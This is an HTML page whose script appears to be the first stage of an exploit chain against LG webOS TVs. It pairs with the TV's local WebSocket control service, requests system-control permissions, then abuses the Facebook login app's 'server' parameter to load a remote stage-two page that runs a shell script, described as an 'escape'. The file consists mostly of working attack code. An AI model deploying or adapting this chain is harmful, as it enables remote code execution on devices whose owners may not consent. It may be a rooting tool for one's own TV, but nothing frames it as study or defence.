<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Beanbird Return</title>
    <style>
        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 10vh; }
        .button { padding: 20px; width: 300px; margin: 10px; font-size: 1.2rem; border-radius: 50px; border: none; cursor: pointer; color: white; }
        #btn-run { background: #ff0066; border: 2px solid #ff9900; }
        #log { background: #000; color: #00ff00; width: 80%; height: 150px; margin: 20px auto; padding: 10px; text-align: left; font-family: monospace; border: 1px solid #333; }
    </style>
</head>
<body>
    <h1>Return the Beanbird Cursor</h1>
    <button id="btn-run" class="button">Return Beanbird Cursor</button>
    <div id="log">Status: Ready.</div>

    <script>
        const logBox = document.getElementById('log');
        const SITE_URL = window.location.origin;

        function log(m) { logBox.innerHTML += `<br>> ${m}`; logBox.scrollTop = logBox.scrollHeight; }

        // This is the manual request function that talks to the TV
        var request = function(ws, uri, payload) {
            ws.send(JSON.stringify({
                id: "req_" + Math.random().toString(36).substring(2, 9),
                type: "request",
                uri: uri,
                payload: payload
            }));
        };

        document.getElementById('btn-run').onclick = function() {
            log("Connecting to TV...");
            var ws = new WebSocket('ws://127.0.0.1:3000');
            
            ws.onopen = function() {
                log("Connection open. Sending Registration...");
                // This payload triggers the prompt in your screenshot
                ws.send(JSON.stringify({
                    id: "register_0",
                    type: "register",
                    payload: { 
                        forcePairing: false, 
                        pairingType: "PROMPT", 
                        manifest: { 
                            permissions: ["LAUNCH", "SYSTEM_CONTROL", "READ_INSTALLED_APPS"] 
                        } 
                    }
                }));
            };

            ws.onmessage = function(e) {
                var res = JSON.parse(e.data);
                if (res.type === "registered") {
                    log("Authorized! Escaping to Stage 2...");
                    
                    // The "Facebook Login" Escape
                    var stage2 = SITE_URL + "/stage2.html?run=beanbird.sh";
                    request(ws, "ssap://system.launcher/launch", {
                        id: "com.webos.app.facebooklogin",
                        params: { 
                            server: stage2.replace(/https?:\/\//, '') + "#" 
                        }
                    });
                }
            };
            ws.onerror = function() { log("Error: Ensure LG Connect Apps is ON."); };
        };
    </script>
</body>
</html>
